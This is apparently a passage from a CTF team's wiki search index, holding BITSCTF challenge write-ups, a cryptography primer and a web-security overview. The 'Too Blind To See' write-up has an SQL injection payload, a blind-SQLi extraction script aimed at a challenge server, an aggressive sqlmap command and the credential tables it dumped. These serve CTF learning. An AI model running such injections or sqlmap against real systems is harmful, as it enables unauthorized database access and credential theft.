len(passwords)\n        print(passwords)\n\n    print(curPass.value)\n\n    ### break\n</code></pre>"},{"location":"bitsctf/#-rev-challenges","title":"- Rev Challenges","text":""},{"location":"bitsctf/#baby-rev","title":"baby-rev","text":"<p>Category: rev</p> <p>Solves: 468</p>"},{"location":"bitsctf/#description_2","title":"### Description","text":"<p>anita max wyinn</p>"},{"location":"bitsctf/#solution_2","title":"### Solution","text":"<p>We are provided with a file, <code>baby-rev</code>.\\ Opened the given file in ghidra.\\ Found the checking function <code>myfunc</code> inside which each character of flag was being checked.</p> <p></p> <p>assembled the flag manually from there to solve.</p>"},{"location":"bitsctf/#flag-bitsctfw3lc0me_t0_r3v","title":"### Flag  - <code>BITSCTF{w3lc0me_t0_r3v}</code>","text":""},{"location":"bitsctf/#maxxing","title":"Maxxing","text":"<p>Open the given minimax binary in a decompiler. From there in main you can see the specific function being called for the win</p> <p></p> <p></p> <p>In this <code>syaaoksnqd</code> function at the end it just prints the red herring flag. But we can also see a hex being created. It is being made and copied into <code>dest</code> in the order provided and this gives </p> <p><code>0x7008761D1E0CC30311AA0A04BD5D44A9F36233921865AE9DD4D471F06298B2FD94F</code></p> <p>If you look more in the function you can see two extra numbers here, an array of size of 3 and the same array of size 3 being multipled at the end.</p> <p></p> <p></p> <p><code>v22 : 0x133, v23 : 0x7E4E0C1</code></p> <p>So we can assume that there were supposedely three numbers that got multiplied in this win funciton. we have specifically three number.</p> <pre><code>from Crypto.Util.number import long_to_bytes\na = 0x7008761D1E0CC30311AA0A04BD5D44A9F36233921865AE9DD4D471F06298B2FD94F\nb = 0x133\nc = 0x7E4E0C1\n\nprint(long_to_bytes(a * b * c))\n</code></pre> <p><code>b'BITSCTF{w3_n33d_t0_st4rT_l0ok5m4Xx1nG}'</code></p>"},{"location":"bitsctf/#touch-grass","title":"Touch Grass","text":"<p>The question provides an apk that counts the number of steps using accelerometer. This has a couple of solutions. </p>"},{"location":"bitsctf/#solution-1","title":"Solution 1:","text":"<p>You can just walk.</p>"},{"location":"bitsctf/#solution-2","title":"Solution 2:","text":"<p>You can shake the phone. This changes the acceleration constantly and it is counted as steps.</p>"},{"location":"bitsctf/#-web-challenges","title":"- Web Challenges","text":""},{"location":"bitsctf/#conquest","title":"Conquest","text":"<p>Category: Web</p> <p>Solves: 62</p>"},{"location":"bitsctf/#given-information","title":"### Given information","text":"<p>Our Mogambro is a lucid dreamer who has meticulously replicated one of his sessions in the form of the given website. Can you also complete the quest which Mogambro failed to do?</p> <p>http://20.244.82.82:2913/</p>"},{"location":"bitsctf/#solution_3","title":"### Solution","text":"<p>The website presents a puzzle:</p> <p>Welcome Adventurer. You are about to take up on an impossible challenge. But first you gotta find the path that takes you to the arena</p> <p><code>/robots.txt</code> returns:</p> <pre><code>User-Agent: *\nDisallow: /tournament\n</code></pre> <p>Upon visiting <code>/tournament</code> we are presented with a leaderboard for what looks like a dragon slaying tournament, and another puzzle:</p> <p></p> <p>Eventually we reach <code>/tournament/humans.txt</code>. This page presents an HTML form with two form inputs which return \"Too Slow. Try Again!\" upon submit:</p> <ul> <li>Hidden text field with the value set to <code>1582510775.828625</code></li> <li>Submit button</li> </ul> <pre><code>&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n    [...]\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;BEWARE! SLAY THE DRAGON IF YOU DARE!&lt;/h1&gt;\n    &lt;form action=\"/legend\" method=\"post\"&gt;\n        &lt;input type=\"hidden\" value=\"1582510775.828625\" name=\"slay\"&gt;\n        &lt;input type=\"submit\" value=\"Fight the Beast!\"&gt;\n    &lt;/form&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p><code>1582510775.828625</code> is actually an UNIX timestamp that refers to <code>Mon Feb 24 07:49:35 AM IST 2020</code>, almost four years in the past.</p> <p>After providing various inputs to the <code>slay</code> form input such as:</p> <ul> <li>negative numbers</li> <li>timestamps with micro (and milli) second offsets to <code>1582510775.828625</code></li> </ul> <p>We are able to obtain the flag on sending an absurdly large number: <code>1e308</code>.</p> <p>Flag: <code>BITSCTF{7HE_r341_7r345Ur3_W45_7H3_Fr13ND5_W3_M4D3_410N6_7H3_W4Y}</code></p>"},{"location":"bitsctf/#too-blind-to-see","title":"Too Blind To See","text":"<p>Category: Web</p> <p>Solves: 17</p>"},{"location":"bitsctf/#given-information_1","title":"### Given information","text":"<p>Mogambro, our rookie intern, just stepped foot into the prestigious Software Firm. His big moment, the first project review, is knocking at the door like a pesky neighbor. But wait! Somewhere in his app lurks a secret which the admins are not aware of, hidden behind the password 'fluffybutterfly'. Can you crack the code and rescue Mogambro from this password puzzle? The clock is ticking!</p> <p>http://20.244.82.82:7000/</p>"},{"location":"bitsctf/#solution_4","title":"### Solution","text":"<p>The given link leads to a boilerplate shopping site which has three forms:</p> <ul> <li>/login<ul> <li>Form 1: User sign in<ul> <li>API endpoint: <code>/welcome-homie</code></li> </ul> </li> <li>Form 2: Admin login<ul> <li>API endpoint: <code>/yesyoudidit</code></li> </ul> </li> </ul> </li> <li>Newsletter form at <code>/</code><ul> <li>API endpoint: <code>/final-destination</code></li> </ul> </li> </ul> <p><code>/yesyoudidit</code> is found to be vulnerable to SQL injection using the payload:</p> <pre><code>' or 1=1;-- -\n</code></pre> <p>But all we get from it is a fake flag:</p> <p></p> <p>The final endpoint <code>/final-destination</code> seems to be following the challenge name's footsteps as it's found to be vulnerable to Blind SQL injection. Inputting <code>' or 1=1;-- -</code> returns a JSON response containing the message \"Email exists in the database\" whereas any other normal input returns \"Email does not exist in the database\".</p> <p>Using the following script we are able to extract the following table names: <code>maillist</code> and <code>userdata</code>.</p> <pre><code>import requests\nimport json\nimport string\n\ncharset = string.ascii_lowercase\nprint(charset)\n\ntable_name = \"\"\n\nurl = \"http://20.244.82.82:7000/final-destination\"\n\nheaders = {\n    \"Content-Type\": \"application/x-www-form-urlencoded\",\n}\n\nwhile True:\n    for c in charset:\n        payload = \"email='%20union%20select%20null%2Cnull%20from%20sqlite_schema%20where%20name%20like%20'{}%25'--\".format(\n            table_name + c\n        )\n\n        response = requests.request(\"POST\", url, headers=headers, data=payload)\n\n        r = json.loads(response.text)\n\n        if r[\"exists\"]:\n            print(\"\\n\", r)\n            table_name += c\n            print(\"Table name:\", table_name)\n            break\n        else:\n            ### print(c, r[\"exists\"], end=\" \")\n            print(\".\", end=\"\", flush=True)\n</code></pre> <p>We utilise sqlmap to further extract the database contents:</p> <pre><code>sqlmap --level 5 --risk 3 -o -r burp_request.txt -p email --thread 10 --all\n</code></pre> <pre><code>Database: &lt;current&gt;\nTable: maillist\n[1 entry]\n+-----------------------------+-----------------+\n| email | password |\n+-----------------------------+-----------------+\n| krazykorgaonkar@hotmail.com | fluffybutterfly |\n+-----------------------------+-----------------+\n\nDatabase: &lt;current&gt;\nTable: userdata\n[1 entry]\n+----+------------------+-----------+\n| id | password | username |\n+----+------------------+-----------+\n| 2 | bxgcrVNmtUehpvgH | knowitall |\n+----+------------------+-----------+\n</code></pre> <p>We are then able to obtain the flag after logging in with the first set of credentials: <code>krazykorgaonkar@hotmail.com:fluffybutterfly</code>.</p> <p>Flag: <code>BITSCTF{5UB5Cr183r5_4r3_M0r3_7HAN_JU5T_C0N5UM3r5}</code></p>"},{"location":"bitsctf/#-misc-challenges","title":"- MISC Challenges","text":""},{"location":"bitsctf/#sanity-check","title":"Sanity Check","text":"<p>Flag found in the rules channel of the discord server</p>"},{"location":"bitsctf/#binary-zoetrope","title":"Binary Zoetrope","text":"<p>Given 1540 text files, each file has 240 lines of which each line has 320 characters, in which each character is either a 1 or a 0. </p> <p>Initial approach was to check if the binary encoded meant something and then checking what the difference was betweeen each consecutive file. And then we notice there is specific difference between consecutive binary. Either they are inverse of each other with a few character difference which is interesting. </p> <p></p> <p>After looking at the challenge name, Zoetrope means images that are displayed to form an animation. Our best guess is that these text files form an image which compiled give an animation. So we ask chatgpt to do the heavy lifting for us.</p> <pre><code>from PIL import Image\nimport os\nfrom glob import glob\n\ndef create_image(file_path):\n    with open(file_path, 'r') as file:\n        lines = file.readlines()\n\n    height = len(lines)\n    width = len(lines[0].strip())\n\n    image = Image.new('1', (width, height), color=0)\n\n    for y, line in enumerate(lines):\n        for x, char in enumerate(line.strip()):\n            pixel_value = int(char)\n            image.putpixel((x, y), pixel_value)\n\n    return image\n\ndef compile_images_into_gif(folder_path, output_path='output.gif'):\n    image_files = glob(os.path.join(folder_path, '*.txt'))\n    images = [create_image(file_path) for file_path in image_files]\n\n    ### Save the images as frames in a GIF\n    images[0].save(output_path, save_all=True, append_images=images[1:], duration=100, loop=0)\n\nif __name__ == \"__main__\":\n    folder_path = 'data'  ### Replace with the actual path to your files\n    compile_images_into_gif(folder_path)\n</code></pre> <p>the end result is like this</p> <p></p> <p><code>BITSCTF{n0w_u_c_m3}</code></p>"},{"location":"bitsctf/#combinatorial-conundrum","title":"Combinatorial Conundrum","text":"<p>Category: Misc Solves: 17</p>"},{"location":"bitsctf/#given-information_2","title":"### Given information:","text":"<p>MogamBro has guarded your flag behind a grand equation. The equation involves 26 mysterious integers each constrained by a set of peculiar bounds. You need to find the number of solutions for the sum. The flag is equal to the remainder when the number of solutions is divided by 69696969.   Wrap the flag that you get in BITSCTF{}</p> <p>There's also a challenge file given, the content:</p> <p>MogamBro has guarded your flag behind a grand equation. The equation involves 26 mysterious integers each constrained by a set of peculiar bounds. You need to find the number of solutions for the sum:</p> <p>x1 + x2 + ... x26 = 69696969</p> <p>The bounds are:</p> <p>2008 &lt;= x1  &lt; 67434882 5828 &lt;= x2  &lt; 35387831 2933 &lt;= x3  &lt; 30133881 411  &lt;= x4  &lt; 63609725 4223 &lt;= x5  &lt; 18566959 1614 &lt;= x6  &lt; 25526751 5679 &lt;= x7  &lt; 44298843 6349 &lt;= x8  &lt; 26793895 117  &lt;= x9  &lt; 40292840 2321 &lt;= x10 &lt; 42293336 2281 &lt;= x11 &lt; 26301527 1939 &lt;= x12 &lt; 50793633 6273 &lt;= x13 &lt; 51546489 1477 &lt;= x14 &lt; 36871159 800  &lt;= x15 &lt; 65314188 4727 &lt;= x16 &lt; 15882817 2828 &lt;= x17 &lt; 40562779 1782 &lt;= x18 &lt; 48186923 1744 &lt;= x19 &lt; 37382713 2486 &lt;= x20 &lt; 56149154 6312 &lt;= x21 &lt; 18170199 2188 &lt;= x22 &lt; 63940428 5380 &lt;= x23 &lt; 58244044 1772 &lt;= x24 &lt; 29193116 2708 &lt;= x25 &lt; 22309445 1528 &lt;= x26 &lt; 40848052</p> <p>The flag is equal to the remainder when the number of solutions is divided by 69696969. Wrap the flag that you get in BITSCTF{}</p>"},{"location":"bitsctf/#solution_5","title":"### Solution:","text":"<p>Here we have to find the number of non-negative integer solution to the equation <code>x1 + x2 + ... x26 = 69696969</code>  with the constraints on each variable given.</p> <p>We can do that using combinatorics, There's a standard stars and bards method of counting to find the solution, this gives a nice explanation. The main problem is that using the above method requires accounting for lots of cases where more than 2 variables be doubly,triply counted.</p> <p>Inclusion-Exclusion principle provides for a much more efficient way to tackle the problem.this  provides for a good explanation on how it works.</p> <p>The script used: <pre><code>### Correcting the usage of comb() function\nfrom math import comb\n\n### Define the target sum\ntarget_sum = 69696969\n\n### Define the bounds\nbounds = [\n    (2008, 67434882), (5828, 35387831), (2933, 30133881), (411, 63609725),\n    (4223, 18566959), (1614, 25526751), (5679, 44298843), (6349, 26793895),\n    (117, 40292840), (2321, 42293336), (2281, 26301527), (1939, 50793633),\n    (6273, 51546489), (1477, 36871159), (800, 65314188), (4727, 15882817),\n    (2828, 40562779), (1782, 48186923), (1744, 37382713), (2486, 56149154),\n    (6312, 18170199), (2188, 63940428), (5380, 58244044), (1772, 29193116),\n    (2708, 22309445), (1528, 40848052)\n]\n\n### Define the number of bounds\nnum_bounds = len(bounds)\n\n### Define a function to calculate the sum of integers within bounds\ndef sum_within_bounds(k):\n    total = 0\n    for i in range(1 &lt;&lt; num_bounds):\n        sign = -1 if bin(i).count('1') % 2 == 0 else 1\n        current_sum = 0\n        for j in range(num_bounds):\n            if (i &gt;&gt; j) &amp; 1:\n                current_sum += bounds[j][0]\n            else:\n                current_sum += bounds[j][1]\n        ### Check if the argument for comb() is non-negative\n        if k - current_sum + num_bounds - 1 &gt;= 0:\n            total += sign * comb(k - current_sum + num_bounds - 1, num_bounds - 1)\n    return total\n\n### Apply inclusion-exclusion principle\nresult = abs(sum_within_bounds(target_sum)) ### Taking absolute value to ensure non-negativity\n\nprint(\"Number of solutions:\", result)\nprint(\"flag:BITSCTF{\"+str(result)+\"}\")\n</code></pre></p> <p>The flag is : BITSCTF{10414036}</p>"},{"location":"crypto/","title":"Cryptography","text":""},{"location":"crypto/#what-is-cryptography","title":"What is Cryptography","text":"<p>It is the study of secure communications techniques that allow only the sender and intended recipient of a message to view its contents.</p> <p></p> <p>Consider the following scenario where Alice wants to communicate with Bob, but doesn't want Eve to be looking at their texts. We use cryptography to encrypt the messages between Alice and Bob so that no eavesdropper like Eve can listen to their conversations.</p>"},{"location":"crypto/#encoding-and-encryption","title":"Encoding and Encryption","text":"<ul> <li>Encoding is a process of putting a sequence of characters into a special format for transmission or storage purposes.</li> <li>An example of encoding is converting ASCII characters to Hex.</li> <li>ASCII: Hello Hex: 48656c6c6f</li> <li>Encryption is the process of translation of data into a secret code. Encryption is the most effective way to achieve data security. To read an encrypted file, you must have access to a secret key or password that enables you to decrypt it.</li> <li>Making the message sent by Alice to Bob unreadable by an outsider is encryption.</li> </ul> <p>Encoding</p> <ul> <li>Base is the total number of unique elements we can use to represent data in an encoding format.</li> <li>Coming Encoding Formats:</li> <li>ASCII - American Standard Code for Information Interchange(a-z,A-Z,0-9)<ul> <li>A-Z - 65-90</li> <li>a-z - 97-122</li> <li>0-9 - 48-57</li> </ul> </li> <li>Binary - Base 2 (0, 1)</li> <li>Hex - Base 16 (0-9, a-f)</li> <li>Base 64 - (A-Z, a-z, 0-9, +, /)</li> </ul> <p>Encryption</p> <ul> <li>Basic terms in encryption:</li> <li>Plain text: The original message that is sent.</li> <li>Cipher text: Encrypted form of the plain text which doesn't have any meaning or is unreadable.</li> <li>Key: A key iis a piece of information, usually a string of numbers or letters, which, when processed through a cryptographic algorithm, can encrypt or decrypt cryptographic data.</li> </ul> <p></p> <p>In the above image, Original Data is the Plaintext and the public key is used by the sender to encrypt the plaintext. Scrambled Data in picture is the ciphertext. The intended receiver has the private key and uses it to decrypt the plaintext that they receive using the private key.</p>"},{"location":"crypto/#types-of-cryptosystems","title":"Types of Cryptosystems","text":"<ul> <li>Symmetric key Cryptosystems use the same key for encryption and decryption processes.</li> <li>Asymmetric key Cryptosystems use different keys for encryption and decryption processes.</li> <li>Public key is used by the sender to encrypt the data.</li> <li>Private key is used by the intended receiver to decrypt the ciphertext</li> </ul>"},{"location":"crypto/#substitution-ciphers","title":"Substitution Ciphers","text":"<p>Substitution ciphers encrypt the plaintext by swapping each letter or symbol in the plaintext by a different symbol as directed by the key.</p> <p></p> <p>In the above example, 'A' is substituted by 'D', 'B' with 'E' and so on.</p> <p>Caesar Cipher</p> <p>It is a type of substitution cipher in which each letter in the plaintext is 'shifted' a certain number of places down the alphabet.</p> <p></p> <p>In the above example, 'd' is substituted by 'e' and 'f' is substituted 'g' and so on. After observing the above example we can see that each letter in the plaintext is shifted by one position to the right in the alphabet.</p> <p>We can say that the shift key is 1 in the above example.</p> <p>Transposition Cipher</p> <p>Transposition cipher scrambles the position of characters without actually changing the original characters in the plaintext.</p> <p>The plaintext is rearranged according to a regular system.</p> <p>The ciphertext is a permutation of the plaintext.</p> <p>Columnar Transposition cipher</p> <p>The plaintext is written row wise with a set number of columns which is generally set as the length of the key.</p> <p>The plaintext is then read column wise based on the column numbers.</p> <p>The columns are usually defined by a keyword and the permutation is defined by the alphabetical order of the letters in the keyword.</p> <p>Example: Consider the plaintext \"hello there\" and the key is \"hey\"</p> <p>Writing the plaintext in rows:</p> <p>h e l</p> <p>l l o</p> <p>t h e</p> <p>r e x</p> <p>Here 'x' is a null that is added to the matrix to completely fill up the matrix.</p> <p>2 1 3</p> <p>h e l</p> <p>l l o</p> <p>t h e</p> <p>r e x</p> <p>Writing the plaintext based on column number we get</p> <p>elhe hltr loex</p> <p>For decryption, we need to get the column length by dividing the message length by the key length. The message can be written out in columns and reorder the columns based by reforming the key.</p>"},{"location":"crypto/#xor","title":"XOR","text":"<p>This is a encryption method which based on the XOR gate</p> <p></p> <p>Since XOR is a stream cipher, the encryption takes place bitwise</p> <ul> <li>Consider 10 XOR 15</li> <li>Convert 10 to binary =&gt; 1010 and convert 15 to binary =&gt; 1111</li> <li>10 XOR 15 is 1010 XOR 1111</li> <li>1010 XOR 1111 is 0101 which is 5</li> </ul> 10 15 10 XOR 15 1 1 0 0 1 1 1 1 0 0 1 1 <p>Properties of XOR:</p> <ul> <li>XOR is Commutative and Associative:</li> <li>a XOR b = b XOR a</li> <li>(a XOR b)XOR c = a XOR (b XOR c)</li> <li>A XOR A = 0</li> <li>A XOR 0 = A</li> <li>If Pt XOR key = Ct then</li> <li>Pt = Ct Xor key</li> <li>key = Pt XOR Ct</li> </ul> <p>Single Byte XOR</p> <ul> <li>The entirety of the plaintext is XORed with only a single character.</li> <li>This makes Single Byte XOR vulnerable to brute force attack.</li> </ul> Plaintext w e l c o m e Key = = = = = = = --- --- --- --- --- --- --- --- Ciphertext J X Q ^ R P X <p>MultiByte XOR</p> <ul> <li>A key of length n is XORed with substring of plaintext of size n.</li> <li>Provides better security than single byte xor.</li> </ul> Plaintext W E L C O M E Key q w e q w e q CIphertext &amp; 2 ) 2 8 ( 4 <p>Attacks on XOR</p> <ul> <li>Brute Force Attack:</li> <li>In this approach we try out all possible keys.</li> <li>In Single Byte XOR, if the key length is one byte i.e 8 bits which gives us 28 possibilities.</li> <li>We XOR the ciphertext with all possible keys and find a resulting plaintext which is human readable.</li> <li>Known Plaintext Attack:</li> <li>If we know a part of the plaintext, then we can XOR it with the corresponding part of the ciphertext to get the key.</li> </ul>"},{"location":"crypto/#modular-arithmetic","title":"Modular Arithmetic","text":"<p>When we divide two Integers A and B, we can write the division A/B in the form: A=BQ+R</p> <p>Where:</p> <ul> <li>A -&gt; Dividend</li> <li>B -&gt; Divisor</li> <li>Q -&gt; Quotient</li> <li>R -&gt; Remainder</li> </ul> <p>Modulo Operator:</p> <p>From the equation A=BQ+R we can get R by the following operation:</p> <ul> <li>R = A%B or R = A mod B</li> <li>Eg: 19%15 = 4</li> </ul> <p>The value of R is always between 0 and B i.e 0 \\&lt;= R \\&lt; B</p> <p>Modulo Inverse:</p> <p>Given a modular arithmetic A mod B:</p> <ul> <li>Modular inverse of A exists on B if, A and B are co primes i.e GCD(A,B) = 1</li> </ul> <p>If 1 = A*C mod B then C is said to be the modular inverse of A on B.</p>"},{"location":"crypto/#basic-rsa","title":"Basic RSA","text":"<ul> <li>RSA algorithm is asymmetric cryptography algorithm.</li> <li>Asymmetric actually means that it works on two different keys i.e. Public Key and Private Key</li> <li>Public Key is given to everyone and Private key is kept private.</li> </ul> <p>Generating Keys in RSA:</p> <p>Generating Public key:</p> <ul> <li>Select two prime numbers p,q</li> <li>n = p*q ; n-&gt;modulus</li> <li>phi(n) = (p-1)*(q-1)</li> <li>Select a integer 'e' such that GCD(e,phi(n)) = 1 and 1 \\&lt; e \\&lt; phi(n)</li> <li>Public Key: (e,n)</li> </ul> <p>Generating Private key:</p> <ul> <li>Calculate value of 'd':</li> <li>e*d mod phi(n) = 1 i.e d = modular inverse of e on phi(n)</li> <li>Private key : (d,n)</li> </ul> <p>Basic Algorithm:</p> <p>Encryption:</p> <ul> <li>M -&gt; plaintext and M \\&lt; n</li> <li>C -&gt; ciphertext</li> <li>C = Me mod n</li> </ul> <p>Decryption:</p> <ul> <li>M = Cd mod n</li> </ul>"},{"location":"web/","title":"Web Exploitation Wiki","text":""},{"location":"web/#overview-of-web-application-security","title":"Overview of Web Application Security","text":"<p>Web Application Security is a specialized area within Information Security that focuses on safeguarding websites, web applications, and web services. It leverages application security principles specifically for the web, ensuring the integrity, confidentiality, and availability of web applications.</p>"},{"location":"web/#understanding-security-threats","title":"Understanding Security Threats","text":"<p>A security threat is a potential risk that could exploit vulnerabilities in a computer system, leading to unauthorized access or damage. These threats can be intentional, such as cyber-attacks, or accidental, such as system failures or natural disasters.</p>"},{"location":"web/#common-security-threats","title":"Common Security Threats","text":"<ul> <li> <p>Virus Threats: Viruses are malicious software programs designed to infect legitimate software, corrupt data, and modify the way applications operate without the user's consent.</p> </li> <li> <p>Hackers and Predators: The human element behind threats, hackers use their technical expertise to bypass security measures and gain unauthorized access to computer systems.</p> </li> <li> <p>Phishing: A technique used to deceive users into providing sensitive information by masquerading as a trustworthy entity in digital communication.</p> </li> </ul>"},{"location":"web/#the-owasp-top-10-vulnerabilities","title":"The OWASP Top 10 Vulnerabilities","text":"<p>The Open Web Application Security Project (OWASP) identifies the most critical web application security risks. Key vulnerabilities include Injection, Broken Authentication, Sensitive Data Exposure, XML External Entities (XXE), Broken Access Control, Security Misconfiguration, Cross-Site Scripting (XSS), Insecure Deserialization, Using Components with Known Vulnerabilities, and Insufficient Logging &amp; Monitoring.</p>"},{"location":"web/#web-development-and-security-tools","title":"Web Development and Security Tools","text":""},{"location":"web/#client-side-technologies","title":"Client-Side Technologies","text":"<ul> <li>HTML: The standard markup language for creating web pages.</li> <li>JavaScript: A programming language that enables interactive web pages.</li> <li>CSS: A style sheet language used for describing the presentation of a document written in HTML or XML.</li> <li>jQuery: A fast, small, and feature-rich JavaScript library.</li> </ul>"},{"location":"web/#server-side-languages","title":"Server-Side Languages","text":"<ul> <li>PHP</li> <li>JavaScript (Node.js)</li> <li>Ruby</li> <li>Python</li> </ul>"},{"location":"web/#important-web-mechanisms","title":"Important Web Mechanisms","text":"<ul> <li>Cookies and Sessions: Essential for managing user sessions and storing user preferences.</li> <li>HTTP Headers and Requests: Fundamental components of the HTTP protocol that facilitate client-server communication.</li> <li>HTTP Methods: GET, POST, PUT, DELETE, CONNECT, HEAD, OPTIONS, TRACE, PATCH, each serving a specific purpose in HTTP transactions.</li> </ul>"},{"location":"web/#developer-tools","title":"Developer Tools","text":"<p>Modern browsers include developer tools for debugging and testing web applications, offering features like JavaScript debugging, network analysis, and DOM manipulation.</p>"},{"location":"web/#vulnerabilities-and-exploits","title":"Vulnerabilities and Exploits","text":""},{"location":"web/#file-upload-vulnerabilities","title":"File Upload Vulnerabilities","text":"<p>Improper handling of file uploads can lead to unauthorized access or code execution on the server.</p>"},{"location":"web/#local-file-inclusion-lfi","title":"Local File Inclusion (LFI)","text":"<p>Allows attackers to include files on a server through the web browser, potentially leading to code execution or data leakage.</p>"},{"location":"web/#sql-injection","title":"SQL Injection","text":"<p>A vulnerability that allows attackers to execute malicious SQL code, potentially accessing or modifying data in the database.</p>"},{"location":"web/#os-command-injection","title":"OS Command Injection","text":"<p>Occurs when web applications execute system commands with user-supplied input, potentially leading to full system compromise.</p>"},{"location":"web/#cross-site-scripting-xss","title":"Cross-Site Scripting (XSS)","text":"<p>A vulnerability where attackers inject malicious scripts into web pages viewed by other users, leading to data theft or session hijacking.</p>"},{"location":"web/#same-origin-policy-sop","title":"Same Origin Policy (SOP)","text":"<p>A security measure that restricts how a document or script from one origin can interact with resources from another origin, crucial for preventing malicious document access.</p>"},{"location":"web/#conclusion","title":"Conclusion","text":"<p>This wiki serves as a comprehensive guide to understanding and mitigating web application vulnerabilities. By adhering to security best practices and staying informed about potential threats, developers and security professionals can safeguard web applications against exploitation.</p>"}]}